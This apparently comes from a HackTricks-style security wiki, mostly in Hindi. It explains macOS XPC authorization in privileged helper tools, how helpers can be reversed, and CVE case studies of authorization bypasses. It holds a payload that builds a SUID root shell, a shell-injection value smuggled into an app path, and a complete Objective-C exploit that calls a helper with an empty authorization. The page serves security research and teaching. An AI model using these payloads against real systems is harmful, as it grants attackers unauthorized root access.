# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple यह authenticate करने का एक और तरीका भी प्रदान करता है कि connecting process के पास **exposed XPC method को call करने की permission है या नहीं**।<sup>[[2]](#references)</sup>

जब किसी application को **privileged user के रूप में actions execute करने** की आवश्यकता होती है, तो app को privileged user के रूप में चलाने के बजाय, यह आमतौर पर एक HelperTool को root के रूप में XPC service के तौर पर install करता है, जिसे app से call करके वे actions perform किए जा सकते हैं। हालांकि, service को call करने वाले app के पास पर्याप्त authorization होना चाहिए।

### ShouldAcceptNewConnection हमेशा YES

इसका एक उदाहरण [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) में पाया जा सकता है। `App/AppDelegate.m` में यह **HelperTool से connect** करने का प्रयास करता है। और `HelperTool/HelperTool.m` में **`shouldAcceptNewConnection`** पहले बताए गए requirements में से किसी को भी **check नहीं करता**। यह हमेशा YES return करेगा:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
इस check को उचित रूप से configure करने के बारे में अधिक जानकारी के लिए:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Application rights

हालांकि, **HelperTool की किसी method को call किए जाने पर authorization हो रहा है**।

`App/AppDelegate.m` का **`applicationDidFinishLaunching`** function app शुरू होने के बाद एक empty authorization reference बनाएगा। यह हमेशा काम करना चाहिए।\
इसके बाद, यह `setupAuthorizationRights` को call करके उस authorization reference में **कुछ rights जोड़ने** का प्रयास करेगा:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m` का `setupAuthorizationRights` function application के rights को auth database `/var/db/auth.db` में store करेगा। ध्यान दें कि यह केवल उन्हीं rights को add करेगा जो अभी database में मौजूद नहीं हैं:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
फ़ंक्शन `enumerateRightsUsingBlock` का उपयोग applications की permissions प्राप्त करने के लिए किया जाता है, जिन्हें `commandInfo` में परिभाषित किया गया है:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
इसका अर्थ है कि इस प्रक्रिया के अंत में, `commandInfo` के अंदर घोषित permissions `/var/db/auth.db` में संग्रहीत होंगी। **प्रत्येक method** के लिए जिसे **authentication की आवश्यकता होगी**, database में **permission name** और **`kCommandKeyAuthRightDefault`** मौजूद होंगे। बाद वाला **यह दर्शाता है कि यह right किसे मिल सकता है**।<sup>[[1]](#references)</sup>

यह दर्शाने के लिए अलग-अलग scopes होते हैं कि किसी right को कौन access कर सकता है। इनमें से कुछ [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) में defined हैं (आप [इन सभी को यहां](https://www.dssw.co.uk/reference/authorization-rights/) पा सकते हैं), लेकिन संक्षेप में:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>कोई भी</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>कोई नहीं</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>वर्तमान user का admin होना आवश्यक है (admin group के अंदर)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>user से authenticate करने के लिए कहें।</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>user से authenticate करने के लिए कहें। उसका admin होना आवश्यक है (admin group के अंदर)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>rules specify करें</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>right पर कुछ अतिरिक्त comments specify करें</td></tr></tbody></table>

### Rights का सत्यापन

`HelperTool/HelperTool.m` में **`readLicenseKeyAuthorization`** function यह जांचता है कि caller को **ऐसा method execute करने** की authorization है या नहीं; इसके लिए यह **`checkAuthorization`** function को call करता है। यह function जांचता है कि calling process द्वारा भेजे गए **authData** का **format सही है या नहीं**, और फिर यह जांचता है कि specific method को call करने के लिए **right प्राप्त करने हेतु क्या आवश्यक है**। यदि सब कुछ सही रहता है, तो **returned `error` `nil` होगा**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
**उस method को call करने का अधिकार प्राप्त करने की requirements की जाँच करने के लिए**, `authorizationRightForCommand` पहले बताए गए **`commandInfo`** object की जाँच करता है। इसके बाद यह **`AuthorizationCopyRights`** को call करके जाँचता है कि **caller के पास function को invoke करने के अधिकार हैं या नहीं** (ध्यान दें कि flags user के साथ interaction की अनुमति देते हैं)।<sup>[[1]](#references)[[3]](#references)</sup>

इस मामले में, function `readLicenseKeyAuthorization` को call करने के लिए `kCommandKeyAuthRightDefault` को `@kAuthorizationRuleClassAllow` पर define किया गया है। इसलिए **कोई भी इसे call कर सकता है**।

### DB की जानकारी

यह बताया गया था कि यह जानकारी `/var/db/auth.db` में stored है। आप सभी stored rules को इस तरह list कर सकते हैं:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
इसके बाद, आप पढ़ सकते हैं कि इस अधिकार तक कौन पहुँच सकता है:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### उदार अधिकार

आप **सभी permissions configurations** [**यहाँ पा सकते हैं**](https://www.dssw.co.uk/reference/authorization-rights/), लेकिन वे combinations जिनमें user interaction की आवश्यकता नहीं होगी, ये हैं:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- यह सबसे direct key है। यदि इसे `false` पर set किया जाता है, तो यह निर्दिष्ट करता है कि इस अधिकार को प्राप्त करने के लिए user को authentication प्रदान करने की आवश्यकता नहीं है।
- इसका उपयोग **नीचे दिए गए 2 में से किसी एक के combination में या उस group को निर्दिष्ट करने के लिए किया जाता है** जिसका user सदस्य होना चाहिए।
2. **'allow-root': 'true'**
- यदि कोई user root user के रूप में operate कर रहा है (जिसके पास elevated permissions होती हैं), और यह key `true` पर set है, तो root user संभावित रूप से further authentication के बिना यह अधिकार प्राप्त कर सकता है। हालांकि, सामान्यतः root user status तक पहुँचने के लिए पहले से ही authentication की आवश्यकता होती है, इसलिए अधिकांश users के लिए यह "no authentication" scenario नहीं है।
3. **'session-owner': 'true'**
- यदि इसे `true` पर set किया जाता है, तो session का owner (वर्तमान में logged-in user) automatically यह अधिकार प्राप्त कर लेगा। यदि user पहले से logged in है, तो इससे additional authentication bypass हो सकता है।
4. **'shared': 'true'**
- यह key authentication के बिना rights grant नहीं करती। इसके बजाय, यदि इसे `true` पर set किया जाता है, तो इसका अर्थ है कि right के authenticated हो जाने के बाद इसे multiple processes के बीच share किया जा सकता है, बिना प्रत्येक process को दोबारा authenticate किए। लेकिन right का initial granting तब भी authentication की आवश्यकता रखेगा, जब तक कि इसे `'authenticate-user': 'false'` जैसी अन्य keys के साथ combine न किया जाए।

Interesting rights प्राप्त करने के लिए आप [**इस script का उपयोग कर सकते हैं**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9):
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Case Studies

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: privileged Mach service `com.acustica.HelperTool` हर connection स्वीकार करता है और इसकी `checkAuthorization:` routine `AuthorizationCopyRights(NULL, …)` को call करती है, इसलिए कोई भी 32‑byte blob पास हो जाता है। इसके बाद `executeCommand:authorization:withReply:` attacker-controlled comma-separated strings को `NSTask` में root के रूप में feed करता है, जिससे इस तरह के payloads संभव हो जाते हैं:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivially एक SUID root shell बनाएँ। Details [इस write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/) में हैं।<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: listener हमेशा YES लौटाता है और वही NULL `AuthorizationCopyRights` pattern `checkAuthorization:` में भी दिखाई देता है। Method `exchangeAppWithReply:` attacker input को दो बार `system()` string में concatenate करता है, इसलिए `appPath` में shell metacharacters inject करने पर (उदाहरण के लिए `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) Mach service `com.plugin-alliance.pa-installationhelper` के माध्यम से root code execution प्राप्त होता है। अधिक जानकारी [यहाँ](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/) है।<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: audit चलाने पर `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` drop होती है, Mach service `com.jamf.complianceeditor.helper` expose होती है, और `-executeScriptAt:arguments:then:` export किया जाता है, लेकिन caller के `AuthorizationExternalForm` या code signature को verify नहीं किया जाता। एक trivial exploit एक empty reference को `AuthorizationCreate` करता है, `[[NSXPCConnection alloc] initWithMachServiceName:NSXPCConnectionPrivileged]` के साथ connect करता है, और root के रूप में arbitrary binaries execute करने के लिए method invoke करता है। Full reversing notes (plus PoC) [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html) में हैं।<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 और 7.4.0–7.4.2 crafted XPC messages स्वीकार करते थे, जो ऐसे privileged helper तक पहुँचते थे जिसमें authorization gates नहीं थे। Helper अपने privileged `AuthorizationRef` पर भरोसा करता था, इसलिए service को message भेज सकने वाला कोई भी local user उसे root के रूप में arbitrary configuration changes या commands execute करने के लिए coerce कर सकता था। Details [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/) में हैं।<sup>[[5]](#references)</sup>

#### त्वरित triage tips

- जब कोई app GUI और helper दोनों ship करता है, तो उनकी code requirements को diff करें और जाँचें कि क्या `shouldAcceptNewConnection` listener को `-setCodeSigningRequirement:` के साथ lock करता है (या `SecCodeCopySigningInformation` को validate करता है)। Missing checks आमतौर पर Jamf case जैसे CWE-863 scenarios उत्पन्न करते हैं। एक quick peek इस तरह दिखता है:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Helper जिस चीज़ को authorize करने के बारे में *सोचता* है, उसकी तुलना client द्वारा दी गई चीज़ से करें। Reverse करते समय, `AuthorizationCopyRights` पर break लगाएँ और पुष्टि करें कि `AuthorizationRef` `AuthorizationCreateFromExternalForm` से आया है (client द्वारा प्रदान किया गया), न कि helper के अपने privileged context से। अन्यथा, संभवतः आपको ऊपर दिए गए मामलों के समान CWE-863 pattern मिला है।

## Authorization को Reverse करना

### जाँच करना कि EvenBetterAuthorization का उपयोग किया गया है या नहीं

यदि आपको यह function मिलता है: **`[HelperTool checkAuthorization:command:]`**, तो संभवतः process authorization के लिए पहले बताए गए schema का उपयोग कर रहा है:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

यदि यह function `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, और `AuthorizationFree` जैसी APIs को call करता है, तो यह [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) pattern का उपयोग कर रहा है।

यह देखने के लिए **`/var/db/auth.db`** को check करें कि क्या user interaction के बिना किसी privileged action को call करने की permissions प्राप्त करना संभव है।

### Protocol Communication

इसके बाद, आपको protocol schema ढूँढना होगा, ताकि XPC service के साथ communication स्थापित किया जा सके।

**`shouldAcceptNewConnection`** function exported किए जा रहे protocol को दर्शाता है:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

इस मामले में, हमारे पास EvenBetterAuthorizationSample जैसा ही है, [**इस line को check करें**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)।

उपयोग किए गए protocol का नाम जानने के बाद, इसे निम्नलिखित command से **header definition dump** करना संभव है:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
अंत में, इसके साथ communication स्थापित करने के लिए हमें केवल exposed **Mach Service** का **name** जानना होगा। इसे खोजने के कई तरीके हैं:

- **`[HelperTool init]`** में, जहाँ उपयोग किए जा रहे Mach Service को देखा जा सकता है:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist में:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

इस उदाहरण में निम्नलिखित बनाए गए हैं:

- functions के साथ protocol की definition
- access मांगने के लिए उपयोग करने हेतु एक empty auth
- XPC service से एक connection
- connection सफल होने पर function को call करना
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## दुरुपयोग किए गए अन्य XPC privilege helpers

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Jamf Compliance Editor में Privilege Escalation](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: FortiClient Mac में Privilege Escalation Flaw](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – macOS पर Aquarius Desktop में Acustica Audio HelperTool XPC Service Local Privilege Escalation](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service Local Privilege Escalation](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Apple EndpointSecurity framework Privilege Escalation (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Authorization Rights Reference (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
